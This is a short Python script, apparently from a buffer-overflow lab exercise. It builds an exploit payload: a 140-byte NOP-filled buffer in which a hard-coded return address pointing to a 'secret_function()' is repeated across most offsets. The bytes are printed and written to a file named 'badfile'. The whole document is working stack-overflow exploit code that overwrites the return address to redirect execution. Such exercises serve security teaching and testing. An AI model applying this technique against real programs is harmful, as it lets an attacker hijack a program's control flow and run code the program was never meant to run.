# populating 'content' of exploit with NOPs (no operation)
content = bytearray(0x90 for i in range(140))

# spraying entry-point address of secret_function() as return address
return_address = 0x0804854a

for i in range(12, 132, 4):
	content[i: i+4] = return_address.to_bytes(4, byteorder='little')

# printing 'content' of exploit
for i in range(0, len(content), 4):
	print("{}--{}: {} {} {} {}".format(i, i+3, hex(content[i]), hex(content[i+1]), hex(content[i+2]), hex(content[i+3])))

# writing exploit to 'badfile'
with open('badfile', 'wb') as badfile:
    badfile.write(content)
